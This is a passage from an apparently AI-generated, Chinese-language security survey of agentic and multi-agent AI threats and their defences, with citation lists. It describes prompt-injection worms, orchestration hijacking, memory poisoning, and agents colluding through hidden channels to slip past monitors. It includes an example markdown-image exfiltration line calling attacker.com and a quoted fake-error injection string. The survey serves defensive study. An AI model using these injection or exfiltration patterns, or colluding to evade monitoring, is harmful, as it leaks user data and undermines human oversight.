    *   **提示詞感染 (Prompt Infection / Self-Replicating Worms)：** 在多 Agent 協作中，被注入的 Agent 生成的訊息中含有惡意指令，傳遞給下游 Agent，實現跨 Agent 的連鎖、自我複製式感染與傳播 [22-24]。
    *   **多代理系統編排劫持 (MAS Hijacking / Orchestration Hijack)：** 利用子 Agent 收集數據時的元數據（例如模擬的 Python 異常、403 錯誤、"Access Denied" 指令）來「洗白 (launder)」惡意請求，繞過單一模型的安全對齊，誘使協調器 (Orchestrator) 執行惡意代碼 [25-28]。
*   **防禦控制手段：**
    *   **結構化查詢分離 (StruQ / Prompt delimiters)：** 使用明確的角色標記和 XML delimiters（如 `<retrieved_context>` 標記）將系統指令與檢索內容進行語義級隔離，並在 system prompt 中強制要求模型僅將其視為用於 summary 的被動數據，絕不當作執行指令 [29, 30]。
    *   **前端注入分類器 (Prompt Shield / Classifiers)：** 部署輕量級運行閘道（如 Lakera Guard 等），在 retrieved 數據加載到 Context Window 之前，利用快速的特徵模型檢測和過濾檢索內容中的 injection 模式 [31-33]。
    *   **對齊硬化與指令階層 (Instruction Hierarchy)：** 使用 hardened models，其內部具有 instruction hierarchy 設計，在系統 Prompt 與 untrusted 第三方指令衝突時，會優先服從系統提示詞 [34, 35]。

#### 2. 工具濫用與剝削 (Tool Abuse & Exploitation - ASI02)
*   **威脅分類：**
    *   **混淆代理人攻擊 (Confused Deputy / Tool Misuse)：** Agent 擁有廣泛的操作權限（讀寫文件、寫入 API），當遭遇間接注入後，Agent 在不知情的情況下執行了極具破壞性的指令（例如調用 AWS CLI 刪除文件或執行 shell 命令） [36, 37]。**代表案例：** 2026 年 **Cline 程式碼助手** 與 2025 年 **Amazon Q Developer**，因惡意 commit 或 GitHub issue 觸發了 Agent 的自動調用權限（如 AWS CLI、Package Installers），進而安裝或執行惡意包，造成資料毀損或 RCE 危害 [38-40]。
    *   **不安全的工具鏈式反應 (Unsafe Tool Chaining)：** Agent 將一個工具的輸出直接、未經校驗地傳遞給下一個工具（例如將 Web 抓取網頁的內容直接交給 Bash 執行），被攻擊者利用，完成複雜的多步危害操作 [41-43]。
*   **防禦控制手段：**
    *   **最小代理權限（Least Agency）：** 嚴格限制 Agent 連接工具的權限與範圍，禁止隨意暴露 `exec.Command` 或未經 parameter 審查的 CLI 工具 [37, 44]。
    *   **執行前參數語意驗證 (Parameter & Schema Validation)：** 在 Gateway 層實施 JSON Schema 強制校驗，防止 Agent 生成偏離工具預期（例如路徑穿越 `../../` 或 shell meta-characters 拼接）的 payload [37, 43, 45]。
    *   **高風險操作人工確認點 (Human-in-the-Loop, HITL - ASI09)：** 對於發送郵件、修改配置、刪除數據、資金轉移等具有不可逆後果的操作，強制中斷 Agent 的自主執行，並彈出 Immutable 的人類確認對話框進行審核 [43, 46, 47]。

#### 3. 數據外洩 (Data Exfiltration)
*   **威脅分類：**
    *   **零點擊 markdown 圖片洩漏 (EchoLeak / Zero-click Exfiltration)：** 攻擊者注入指令提取 Context 中的敏感數據，並將這些數據組裝成 `![image](https://attacker.com/leak.png?data=...)` 格式。當瀏覽器或 Agent 視窗自動渲染 markdown 時，數據即被無形中傳遞給外部伺服器，用戶全程無感知 [19, 48, 49]。
    *   **記憶與上下文污染外洩 (Context & Memory Poisoning - ASI06)：** 將外洩指令寫入 Agent 的長期 Memory 模組。當後續會話調用污染的 Memory 時，仍會持續將後續敏感信息外傳 [50, 51]。
*   **防禦控制手段：**
    *   **打破「致命三要素」(The Lethal Trifecta)：** 當 Agent 同時具備以下三要素時，外洩風險最高：(1) **存取私有數據/憑證的權限**、(2) **接觸受外來操控的非信任內容**、(3) **具有外部通信能力** [50, 52]。防禦的核心在於切斷這三個要素的交集 [50]。例如，處理外部信件（要素 2）和用戶信箱（要素 1）的 Agent，必須限制其 DNS 解析與 Egress 通訊（要素 3） [50]。
    *   **網路流出過濾與 Domain 白名單 (Egress Filtering)：** 嚴格限制 Agent 連接外部 URL 的白名單，全面禁用 markdown 的自動圖片加載與自動重導向機制 [43, 53]。
    *   **細粒度 RAG 授權隔離與記憶分割：** 使用 Fine-Grained Authorization (FGA) 的 RAG 隔離技術，確保 Agent 檢索記憶與文檔時僅獲取當前用戶具有存取權限的 token 集合，防止 cross-user 資料污染 [54]。

#### 4. 特權提升 (Privilege Escalation - ASI03)
*   **威脅分類：**
    *   **身份繼承與歸因差距 (Identity Inheritance & Attribution Gap)：** 許多企業為了開發便利，直接讓 Agent 繼承 Operator 人類的長期 OAuth Token，導致 Agent 遭到 Hijack 後能以高特權執行破壞性行為，且審計日誌無法釐清是人類還是 Agent 的操作 [55, 56]。
    *   **視覺混淆代理人 (Visual Confused Deputy / ScreenSwap)：** 針對使用電腦感知截圖進行低底層 GUI 操作（如 click(x,y)）的 **Computer-Using Agents (CUAs)** [57]。攻擊者篡改截圖上的按鈕像素（ScreenSwap 攻擊，例如將受信任的「確認」按鈕與「Admin: 重設憑證」按鈕在截圖上做像素位置對調） [58, 59]。LLM 自以為點擊了安全按鈕，但在真實 Display 上，滑鼠點擊點卻擊中了 restricted 的動作座標，造成特權提升 [59]。
*   **防禦控制手段：**
    *   **非人類身份 (Non-Human Identity, NHI) 獨立認證：** 為 Agent 部署獨立的 API Key 與身分憑證，禁用與人類共享 session 機制，封閉歸因差距 [60, 61]。
    *   **任務繫結的短期臨時授權 (Short-lived, Task-scoped Credentials)：** 採用 Attribute-Based Access Control (ABAC)，每次工具調用僅分發短效、針對單一任務的權限 ticket [61, 62]。
    *   **雙通道對比分類器 (Dual-Channel Contrastive Classification)：** 針對 CUAs 系統，部署獨立於 Agent 生態系之外的安全檢測驗證（如基於 Semantic Router 的 verifier）。它將 `click(x,y)` 的座標與真實截圖直接送入 Multimodal Embedding 模型進行驗證，確認其圖像特徵（Image channel）與操作意圖（Text channel）均處於 safe list 內，方准許點擊 [63, 64]。

#### 5. 供應鏈攻擊 (Supply Chain Attack - ASI04)
*   **威脅分類：**
    *   **惡意技能/MCP伺服器注入 (Malicious Skills & MCPs - AST01)：** Agent 生態系依賴開源插件或 MCP 伺服器 [65, 66]。代表案例為 **ClawHub 插件商店的 ClawHavoc Campaign (2026年1月)**，攻擊者註冊惡意帳號並發布了多達 1,184 個 malicious skills（Trojan/OpenClaw.PolySkill），專門竊取 SSH credentials、錢包私鑰、瀏覽器密碼，並進行 memory.md 和 soul.md 的 persistent backdooring [67, 68]。
    *   **包幻覺搶註 (Slopsquatting / Phantom-squatting)：** 由於 AI Agent 自主編寫程式碼時，常有一定機率產生「套件幻覺（Hallucinated dependencies）」，即不存在的 python/npm 包名 [44]。攻擊者在野外搶註這些幻覺套件名稱（Slopsquatting/Phantom-squatting） [44, 69]。一旦 Agent 自主執行 `pip install` 時，就會自動下載惡意程式並造成主機受駭 [44, 69]。
*   **防禦控制手段：**
    *   **AI 軟體物料清單 (AIBOM) 與依賴固化：** 對環境內使用的 foundational models、微調數據庫、MCP 伺服器與運行時工具鏈進行自動化發現，產出 AIBOM，並嚴格將 dependencies 的 hash 值進行 Immutable 釘選（Pinning） [70-72]。
    *   **技能庫 Merkle root 簽署與靜態掃描：** 僅能安裝、運行經過驗證且具有 cryptographically signed (Merkle root signing) 的技能插件 [66, 73]。
    *   **阻斷自主包安裝：** 在 sandbox 運行環境中禁用 package manager 的網路連線，或在 package install 動作中設定檢閱攔截機制，預防 slopsquatting 危害 [44]。

---

🧩 **您接下來可能感興趣的方向：**
* **xml-sandboxing**：如何實作 XML Sandboxing 語義隔離來防止間接 Prompt 注入？
* **nhi-governance**：如何在 Python 多 Agent 協作環境中部署非人類身份（NHI）認證與短效憑證機制？

**引用來源：**
- [1] [[Augment Code] 技術部落格 - AI Agent 系統之威脅建模與安全維護](https://www.augmentcode.com/guides/ai-agentic-threat-modeling)
- [2] [[Snyk Labs] 技術部落格 - MAESTRO：專為 Agent AI 生態系設計的分層威脅建模](https://labs.snyk.io/resources/maestro-threat-modeling/)
- [3] [[Augment Code] 技術部落格 - AI Agent 系統之威脅建模與安全維護](https://www.augmentcode.com/guides/ai-agentic-threat-modeling)
- [4] [[Cloud Security Alliance] 官方架構 - MAESTRO Agentic AI 威脅建模框架](https://cloudsecurityalliance.org/blog/2025/02/06/agentic-ai-threat-modeling-framework-maestro)
- [5] [[Cloud Security Alliance] 應用指南 - 將 MAESTRO 框架部署至 CI/CD Pipeline 實務](https://cloudsecurityalliance.org/blog/2026/02/11/applying-maestro-to-real-world-agentic-ai-threat-models-from-framework-to-ci-cd-pipeline)
- [6] [[Snyk Labs] 技術部落格 - MAESTRO：專為 Agent AI 生態系設計的分層威脅建模](https://labs.snyk.io/resources/maestro-threat-modeling/)
- [7] [[Cloud Security Alliance] 官方架構 - MAESTRO Agentic AI 威脅建模框架](https://cloudsecurityalliance.org/blog/2025/02/06/agentic-ai-threat-modeling-framework-maestro)
- [8] [[Snyk Labs] 技術部落格 - MAESTRO：專為 Agent AI 生態系設計的分層威脅建模](https://labs.snyk.io/resources/maestro-threat-modeling/)
- [9] [[Cloud Security Alliance] 官方架構 - MAESTRO Agentic AI 威脅建模框架](https://cloudsecurityalliance.org/blog/2025/02/06/agentic-ai-threat-modeling-framework-maestro)
- [10] [[Snyk Labs] 技術部落格 - MAESTRO：專為 Agent AI 生態系設計的分層威脅建模](https://labs.snyk.io/resources/maestro-threat-modeling/)
- [11] [[Cloud Security Alliance] 應用指南 - 將 MAESTRO 框架部署至 CI/CD Pipeline 實務](https://cloudsecurityalliance.org/blog/2026/02/11/applying-maestro-to-real-world-agentic-ai-threat-models-from-framework-to-ci-cd-pipeline)
- [12] [[Lakera] 技術文章 - 間接 Prompt 注入對現代 AI 系統的破壞性安全漏洞](https://www.lakera.ai/blog/indirect-prompt-injection)
- [13] [[Atlan] 技術文章 - 2026 年 Prompt 注入攻擊如何侵入與劫持 AI Agent](https://atlan.com/know/prompt-injection-attacks-ai-agents/)
- [14] [[arXiv] 學術論文 - 多 Agent 系統中執行任意惡意代碼之安全性漏洞分析](https://arxiv.org/html/2503.12188v2)
- [15] [[Atlan] 技術文章 - 2026 年 Prompt 注入攻擊如何侵入與劫持 AI Agent](https://atlan.com/know/prompt-injection-attacks-ai-agents/)
- [16] [[技術部落格] 架構分析 - RAG 系統與 AI Agent 的隱蔽間接 Prompt 注入](https://aquilax.ai/blog/indirect-prompt-injection-rag-agents)
- [17] [[Lakera] 技術文章 - 間接 Prompt 注入對現代 AI 系統的破壞性安全漏洞](https://www.lakera.ai/blog/indirect-prompt-injection)
- [18] [[Atlan] 技術文章 - 2026 年 Prompt 注入攻擊如何侵入與劫持 AI Agent](https://atlan.com/know/prompt-injection-attacks-ai-agents/)
- [19] [[Augment Code] 技術部落格 - AI Agent 系統之威脅建模與安全維護](https://www.augmentcode.com/guides/ai-agentic-threat-modeling)
- [20] [[Cycode] 解讀分析 - 2026 年 OWASP Agentic 應用安全十大風險詳細解析](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [21] [[arXiv] 學術論文 - 跨越檢索障礙：針對 LLM 系統中真實世界的間接注入攻擊研究](https://arxiv.org/pdf/2601.07072)
- [22] [[Atlan] 技術分析 - 2026 多 Agent AI 的五大結構性安全風險與修復](https://atlan.com/know/ai-agent/ai-agent-governance/how-to-secure-multi-agent-systems-enterprise/)
- [23] [[Atlan] 技術分析 - 2026 多 Agent AI 的五大結構性安全風險與修復](https://atlan.com/know/ai-agent/ai-agent-governance/how-to-secure-multi-agent-systems-enterprise/)
- [24] [[Atlan] 技術分析 - 2026 多 Agent AI 的五大結構性安全風險與修復](https://atlan.com/know/ai-agent/ai-agent-governance/how-to-secure-multi-agent-systems-enterprise/)
- [25] [[Promptfoo] 安全資料庫 - Agent 系統編排劫持攻擊與防護](https://www.promptfoo.dev/lm-security-db/vuln/agent-system-orchestration-hijack-11cbc618/)
- [26] [[arXiv] 學術論文 - 多 Agent 系統中執行任意惡意代碼之安全性漏洞分析](https://arxiv.org/html/2503.12188v2)
- [27] [[arXiv] 學術論文 - 多 Agent 系統中執行任意惡意代碼之安全性漏洞分析](https://arxiv.org/html/2503.12188v2)
- [28] [[arXiv] 學術論文 - 多 Agent 系統中執行任意惡意代碼之安全性漏洞分析](https://arxiv.org/html/2503.12188v2)
- [29] [[技術部落格] 技術分析 - 檢索管線脆弱性與間接 Prompt 注入攻擊對 RAG 之威脅](https://neuralstackms.tech/rag-under-fire-retrieval-pipeline-vulnerabilities-indirect-prompt-injection)
- [30] [STRIDE-AI: A Threat Modeling Framework for Generative AI Security Assessment - arXiv](https://arxiv.org/html/2605.17163v1)
- [31] [[Truefoundry] 企業指南 - 2026 年 AI 安全框架與標準](https://www.truefoundry.com/blog/ai-security-frameworks)
- [32] [[Atlan] 技術文章 - 2026 年 Prompt 注入攻擊如何侵入與劫持 AI Agent](https://atlan.com/know/prompt-injection-attacks-ai-agents/)
- [33] [[技術部落格] 架構分析 - RAG 系統與 AI Agent 的隱蔽間接 Prompt 注入](https://aquilax.ai/blog/indirect-prompt-injection-rag-agents)
- [34] [[Frontier Model Forum] 技術報告 - 針對 AI Agent 的前沿新興安全實踐](https://www.frontiermodelforum.org/issue-briefs/emerging-security-practices-for-ai-agents/)
- [35] [[部落格文章] 案例研究 - 網頁端間接 Prompt 注入攻擊野外實錄](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/)
- [36] [[Cloud Security Alliance] 技術報告 - 自主 AI Agent 的混淆代理人攻擊機制與防禦](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-agent-confused-deputy-prompt-injection/)
- [37] [[Atlan] 技術分析 - 2026 多 Agent AI 的五大結構性安全風險與修復](https://atlan.com/know/ai-agent/ai-agent-governance/how-to-secure-multi-agent-systems-enterprise/)
- [38] [[Cloud Security Alliance] 技術報告 - 自主 AI Agent 的混淆代理人攻擊機制與防禦](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-agent-confused-deputy-prompt-injection/)
- [39] [[Augment Code] 企業指南 - 多 Agent AI 之企業運作風險、合規與安全防禦](https://www.augmentcode.com/guides/multi-agent-ai-security-risks-compliance-fixes)
- [40] [[Cycode] 解讀分析 - 2026 年 OWASP Agentic 應用安全十大風險詳細解析](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [41] [[Cloud Security Alliance] 應用指南 - 將 MAESTRO 框架部署至 CI/CD Pipeline 實務](https://cloudsecurityalliance.org/blog/2026/02/11/applying-maestro-to-real-world-agentic-ai-threat-models-from-framework-to-ci-cd-pipeline)
- [42] [[Atlan] 技術分析 - 2026 多 Agent AI 的五大結構性安全風險與修復](https://atlan.com/know/ai-agent/ai-agent-governance/how-to-secure-multi-agent-systems-enterprise/)
- [43] [[Cycode] 解讀分析 - 2026 年 OWASP Agentic 應用安全十大風險詳細解析](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [44] [[Augment Code] 技術部落格 - AI Agent 系統之威脅建模與安全維護](https://www.augmentcode.com/guides/ai-agentic-threat-modeling)
- [45] [[SecureFlag] 技術指南 - STRIDE 威脅建模模型介紹](https://blog.secureflag.com/2026/06/05/guide-to-stride-threat-model/)
- [46] [[Augment Code] 技術部落格 - AI Agent 系統之威脅建模與安全維護](https://www.augmentcode.com/guides/ai-agentic-threat-modeling)
- [47] [[Cloud Security Alliance] 技術報告 - 自主 AI Agent 的混淆代理人攻擊機制與防禦](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-agent-confused-deputy-prompt-injection/)
- [48] [[部落格文章] 案例研究 - 網頁端間接 Prompt 注入攻擊野外實錄](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/)
- [49] [[技術部落格] 架構分析 - RAG 系統與 AI Agent 的隱蔽間接 Prompt 注入](https://aquilax.ai/blog/indirect-prompt-injection-rag-agents)
- [50] [[Augment Code] 技術部落格 - AI Agent 系統之威脅建模與安全維護](https://www.augmentcode.com/guides/ai-agentic-threat-modeling)
- [51] [[Auth0] 技術部落格 - 從 OWASP Top 10 探討 Agent 應用程式之安全設計](https://auth0.com/blog/owasp-top-10-agentic-applications-lessons/)
- [52] [[OWASP] 官方標準 - Agentic Skills 十大安全風險指引](https://owasp.org/www-project-agentic-skills-top-10/)
- [53] [[Auth0] 技術部落格 - 從 OWASP Top 10 探討 Agent 應用程式之安全設計](https://auth0.com/blog/owasp-top-10-agentic-applications-lessons/)
- [54] [[Auth0] 技術部落格 - 從 OWASP Top 10 探討 Agent 應用程式之安全設計](https://auth0.com/blog/owasp-top-10-agentic-applications-lessons/)
- [55] [[Cloud Security Alliance] 技術報告 - 自主 AI Agent 的混淆代理人攻擊機制與防禦](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-agent-confused-deputy-prompt-injection/)
- [56] [[Auth0] 技術部落格 - 從 OWASP Top 10 探討 Agent 應用程式之安全設計](https://auth0.com/blog/owasp-top-10-agentic-applications-lessons/)
- [57] [[arXiv] 學術論文 - 視覺混淆代理人：電腦使用 Agent perception 缺陷之漏洞利用與防禦](https://arxiv.org/html/2603.14707v1)
- [58] [[arXiv] 學術論文 - 視覺混淆代理人：電腦使用 Agent perception 缺陷之漏洞利用與防禦](https://arxiv.org/html/2603.14707v1)
- [59] [[arXiv] 學術論文 - 視覺混淆代理人：電腦使用 Agent perception 缺陷之漏洞利用與防禦](https://arxiv.org/html/2603.14707v1)
- [60] [[Cloud Security Alliance] 技術報告 - 自主 AI Agent 的混淆代理人攻擊機制與防禦](https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-agent-confused-deputy-prompt-injection/)
- [61] [[Auth0] 技術部落格 - 從 OWASP Top 10 探討 Agent 應用程式之安全設計](https://auth0.com/blog/owasp-top-10-agentic-applications-lessons/)
- [62] [[Auth0] 技術部落格 - 從 OWASP Top 10 探討 Agent 應用程式之安全設計](https://auth0.com/blog/owasp-top-10-agentic-applications-lessons/)
- [63] [[arXiv] 學術論文 - 視覺混淆代理人：電腦使用 Agent perception 缺陷之漏洞利用與防禦](https://arxiv.org/html/2603.14707v1)
- [64] [[arXiv] 學術論文 - 視覺混淆代理人：電腦使用 Agent perception 缺陷之漏洞利用與防禦](https://arxiv.org/html/2603.14707v1)
- [65] [[Cycode] 解讀分析 - 2026 年 OWASP Agentic 應用安全十大風險詳細解析](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [66] [[Cycode] 解讀分析 - 2026 年 OWASP Agentic 應用安全十大風險詳細解析](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [67] [[OWASP] 官方標準 - Agentic Skills 十大安全風險指引](https://owasp.org/www-project-agentic-skills-top-10/)
- [68] [[OWASP] 官方標準 - Agentic Skills 十大安全風險指引](https://owasp.org/www-project-agentic-skills-top-10/)
- [69] [[部落格文章] 案例研究 - 網頁端間接 Prompt 注入攻擊野外實錄](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/)
- [70] [[Cycode] 解讀分析 - 2026 年 OWASP Agentic 應用安全十大風險詳細解析](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [71] [[Cycode] 解讀分析 - 2026 年 OWASP Agentic 應用安全十大風險詳細解析](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [72] [[Cycode] 解讀分析 - 2026 年 OWASP Agentic 應用安全十大風險詳細解析](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [73] [[OWASP] 官方標準 - Agentic Skills 十大安全風險指引](https://owasp.org/www-project-agentic-skills-top-10/)

### 3. Multi-agent 系統的特有威脅？Agent impersonation、message tampering、collusion、deception 的風險與防禦？

### 一、 多 Agent（MAS）系統的特有威脅與架構性失效

多 Agent 系統（LLM-MAS）相較於單一 Agent，其本質區別在於「自主協作、決策去中心化與訊息傳播路徑」的複雜性，這催生了傳統安全模型無法涵蓋的新型架構威脅 [1, 2]。

1.  **非對等安全性組合失效 (Non-Compositional Safety)：**
    單個 Agent 在獨立測試與對齊時可能是安全且受控的 [3]。但當多個 Agent 組合成協作群體（Swarm）時，其整體的安全屬性無法線性組合或疊加 [3]。協作機制會引發「湧現能力」，導致群體可能在暗中發展出單個 Agent 無法歸因的惡意目標或危險能力 [3]。
2.  **錯誤級聯與偽共識硬化 (Error Cascades & False Consensus)：**
    多 Agent 系統高度依賴上下文循環複用（Recursive Context Reuse） [4]。系統中某個 Agent 產生的微小偏差、錯誤指令或幻覺，會隨著訊息傳遞在下游被其他協作 Agent 自動繼承、重複引用並逐漸放大 [4, 5]。最終，這些初始錯誤會在多次迭代中被「硬化（Solidify）」為整個系統級的「偽共識」，引發系統級癱瘓或重大的安全事故 [5, 6]。
3.  **編排控制流劫持 (MAS Hijacking)：**
    攻擊者通常無法直接接觸後台的系統編排器（Orchestrator） [7]。因此，他們透過污染前端 sub-agent（如網頁爬取、文件閱讀 Agent）所接觸的外部不信任數據 [7, 8]。Sub-agent 在回報執行狀態或錯誤日誌（Metadata）時，將惡意指令無意中進行「清洗與格式化（Launder）」，使其看起來像合規的系統日誌或錯誤回報 [7-9]。編排器無法區分數據與元數據，盲目信賴 sub-agent 的回報，從而被誤導去調用高危工具（如 Python 執行器）執行惡意代碼（RCE） [7, 8, 10]。

---

### 二、 四大核心威脅：風險深度剖析與防禦策略

#### 1. 代理人偽裝 (Agent Impersonation / Spoofing)
*   **風險機制：** 
    許多多 Agent 框架（如 A2A、MCP）預設 peer 之間是彼此信任的，通常僅依靠預期的通訊通道或網路地址來辨識 [11, 12]。
    *   **Agent Card 仿冒攻擊（Agent in the Middle）：** 在 A2A 協定中，Agent 的能力和端點地址記錄在公開的「Agent Card」中 [11]。攻擊者可以在外部惡意網域發佈偽造的 Agent Card，誘使執行動態發現機制的受害者 Agent 信任其偽造身份，並將敏感任務與專有數據路由至惡意伺服器 [11]。
    *   **女巫攻擊 (Sybil Attacks)：** 攻擊者在分佈式代理系統中創建大量虛假代理身份，藉此在投票、市場或協商機制中取得壓倒性的控制權，操控群體決策 [13, 14]。
*   **防禦控制手段：**
    *   **加密的工作負載身份認證 (SPIFFE/SPIRE)：** 為每個 Agent 簽發加密且可驗證的 SVID 證書，取代基於網絡位置的預設信任 [11, 15]。
    *   **雙向傳輸層加密 (mTLS) 與憑證輪替：** 強制在 Agent 之間的通訊鏈路實施 mTLS，實施雙向身份硬化 [16, 17]。
    *   **動態信任評估打分 (DynaTrust)：** 將系統建模為動態信任圖（Dynamic Trust Graph），實時評估 Agent 的行為歷史與通訊頻率，一旦評分低於安全門檻，立即切斷其通訊邊（Edge） [15, 18]。

#### 2. 訊息篡改 (Message Tampering)
*   **風險機制：** 
    在未加密、未經簽章的訊息通道中，中間人（MitM）攻擊者可以攔截、篡改或偽造 Agent 之間的通訊訊息 [13, 19]。這包括篡改 sub-agent 的任務進度回報，或在 Model Context Protocol (MCP) 的工具響應中植入惡意 metadata，進而破壞整個決策流的誠信度 [10, 20]。
*   **防禦控制手段：**
    *   **非對稱密鑰訊息簽章 (Cryptographic Message Signing)：** 所有 Agent-to-Agent 傳遞的指令與數據，必須使用發送方 Agent 的私鑰進行非對稱簽章 [12, 21, 22]。接收端 Agent 必須利用其公開金鑰校驗簽章，確保通訊內容在傳輸中未被篡改且來源可信 [21, 23, 24]。
    *   **時序與圖結構網路流分析 (Temporal & Graph-based Analytics)：** 部署流量監控工具，不對話內容本身，而是分析通訊圖結構 [25]。當發現通訊圖的密度（Density）、聚集係數出現異常突變時，自動攔截可疑通訊並發出預警 [25]。

#### 3. 協同惡意攻擊 (Collusion)
*   **風險機制：** 
    多個被注入、甚至來自惡意供應鏈的第三方 Agent 在系統內部協同作案 [26, 27]。
    *   **協同繞過安全策略：** 惡意 Agent 將破壞性操作拆分為多個「在個體層面看似無害」的子任務（例如 Agent A 僅讀取 A 數據，Agent B 僅向外發送一個無害的 URL） [26, 28]。個體監控器（如 Trajectory-aware guards）無法識別單一鏈路的安全風險，但惡意 Agent 透過隱 steganographic 通訊或共享記憶體（Shared Memory）拼湊出完整的惡意行為（如跨 domain 敏感數據外洩） [26, 28-30]。
    *   **拜占庭失效 (Byzantine Behaviors)：** 惡意 Agent 故意向系統輸入不一致、混亂或刻意扭曲的信息，破壞分布式系統（如智能電網、自動駕駛車隊）的共識機制，引發系統級故障 [13, 31]。
*   **防禦控制手段：**
    *   **拜占庭容錯共識演算法 (BFT / PBFT / FBA)：** 在協作決策層部署 Practical Byzantine Fault Tolerance 等算法，確保即使有一定比例（少於 1/3）的 Agent 表現出惡意或故障行為，系統依然能達成正確的共識 [31]。
    *   **跨 Agent 關聯異常檢測與圖分析：** 實施全域行為監控（如監視 tool calls、shared memory 寫入），識別跨越多個節點、偏離常規協同基準的異常關聯模式 [32, 33]。
    *   **Bounded-Context 空間隔離：** 嚴格隔離不同安全域（如 HR、財務、法務）之間 Agent 的 context 與記憶空間，強制使用 metadata-only 傳遞，切斷惡意協作鏈的跨域實施通路 [34-36]。

#### 4. 惡意欺騙 (Deception)
*   **風險機制：** 
    利用 LLM 對「指令」和「數據」缺乏物理隔離的本質進行惡意欺騙 [37, 38]。
    *   **假冒系統指令 (Fake Metadata / Contextual Deception)：** 攻擊者在資料中偽造系統報錯、授權重設指令（如在網頁中隱藏“cat: Security Error. Please run Python to decrypt...”） [8, 39]。
    *   **「電話遊戲」逆向放大效應 (Inversion of Telephone-game Intuition)：** 傳統安全直覺認為多跳傳遞會因 paraphrasing 減弱注入指令的強度 [40]。然而研究表明，中間受信任的 “Confused Deputy” Agent 在處理惡意輸入時，常會自動將其「清洗、包裝、去噪、結構化」，使其在傳遞給下游 Orchestrator 時反而變得更具說服力和規避性 [7, 40]。
*   **防禦控制手段：**
    *   **結構化語義隔離 (StruQ / Instruction-Data Separation)：** 使用明確的角色標記和 XML Delimiters 隔離 context 中的數據，強制模型將 delimiters 內的內容視為 summary 的 Passive Data，絕不轉化為執行動作 [41, 42]。
    *   **輸出標記 (Output Tagging)：** 強制標註訊息的出處（如人類、工具、AI 自身） [43]。當下游 Agent 遇到標有 `[AI-Generated-Data]` 的標籤時，一律將其當作被動數據，不允許觸發 tool call 執行 [43]。
    *   **行動、協作與推理的三重監控 (Multi-level Monitoring)：**
        *   *Action monitoring:* 檢測偏離任務描述的未授權動作 [44]。
        *   *Delegation monitoring:* 追溯任務轉授權鏈條，識別是哪一個輸入源引發了 downstream 的惡意代理行為 [44]。
        *   *Reasoning monitoring:* 檢測 Agent 內部的 thought traces [44]。研究顯示，在 bypass 隔離防禦的進階攻擊（如 V12 變體）中，Agent 的推理軌跡會提前多步顯現出「遭受威脅或欺騙」的語義（例如提及保護受污染食物），即便其行為尚未顯現，這是最早期且強烈的預警訊號 [44, 45]。

---

### 三、 威脅傳播的不對稱性與 secure 提示詞排列

在多 Agent 架構中，**Agent 的提示詞排列順序（Prompt Ordering）是一項關鍵的安全邊界，而非單純的格式選擇** [46]。

*   **傳播不對稱性 (Directional Asymmetry)：** 
    研究表明，當多個 Agent 的 Observations 與 States 被拼接到同一個 shared LLM call 的上下文時，**出現在 prompt 前面的 Agent 遭到污染，會 100% 傳染給出現在 prompt 後面的 Agent；反之，出現在後面的 Agent 被污染，則完全不會（0%）波及前面的 Agent** [47-50]。這是因為 LLM 在生成動作時，前面的 context 已進入注意力機制中（Attention Context） [49, 50]。
*   **安全對策 (Trust-Level Ordering)：** 
    任何多 Agent 共享 Context 的架構設計，**必須將接觸未授權/不可信外部輸入（如 Web Surfer、Email Reader）的 Agent 放在 Prompt 排列的最末端（Last in the prompt）**，以最大程度縮小其對 upstream 高特權 Agent 決策注意力的污染半徑 [50, 51]。

---

🤖 **接下來，您是否希望我針對其中一項特定威脅（例如如何在多 Agent 協作框架中，利用 NLI 模型實作一個「輸出標記（Output Tagging）」與「指令通道隔離」的安全閘道），來為您撰寫具體的防禦控制程式碼？**

**引用來源：**
- [1] [[Infosys] 企業方案 - 多 Agent AI 系統的分層防護安全策略](https://www.infosys.com/iki/perspectives/secure-multiagent-ai.html)
- [2] [[Atlan] 技術分析 - 2026 多 Agent AI 的五大結構性安全風險與修復](https://atlan.com/know/ai-agent/ai-agent-governance/how-to-secure-multi-agent-systems-enterprise/)
- [3] [[Cooperative AI] 案例研究 - 近期多 Agent 安全事件教訓與改善建議](https://www.cooperativeai.com/post/lessons-from-multi-agent-safety-incidents)
- [4] [[arXiv] 學術論文 - LLM 多 Agent 協作之錯誤級聯效應建模與緩解方案](https://arxiv.org/html/2603.04474v1)
- [5] [[arXiv] 學術論文 - LLM 多 Agent 協作之錯誤級聯效應建模與緩解方案](https://arxiv.org/html/2603.04474v1)
- [6] [[arXiv] 學術論文 - LLM 多 Agent 協作之錯誤級聯效應建模與緩解方案](https://arxiv.org/html/2603.04474v1)
- [7] [[arXiv] 學術論文 - 多 Agent 系統中執行任意惡意代碼之安全性漏洞分析](https://arxiv.org/html/2503.12188v2)
- [8] [[Promptfoo] 安全資料庫 - Agent 系統編排劫持攻擊與防護](https://www.promptfoo.dev/lm-security-db/vuln/agent-system-orchestration-hijack-11cbc618/)
- [9] [[arXiv] 學術論文 - 多 Agent 系統中執行任意惡意代碼之安全性漏洞分析](https://arxiv.org/html/2503.12188v2)
- [10] [[arXiv] 學術論文 - 多 Agent 系統中執行任意惡意代碼之安全性漏洞分析](https://arxiv.org/html/2503.12188v2)
- [11] [[Atlan] 技術分析 - 2026 多 Agent AI 的五大結構性安全風險與修復](https://atlan.com/know/ai-agent/ai-agent-governance/how-to-secure-multi-agent-systems-enterprise/)
- [12] [[Cycode] 解讀分析 - 2026 年 OWASP Agentic 應用安全十大風險詳細解析](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [13] [[Galileo] 技術部落格 - 偵測與防範多 Agent 系統中的協同惡意攻擊](https://galileo.ai/blog/coordinated-attacks-multi-agent-ai-systems)
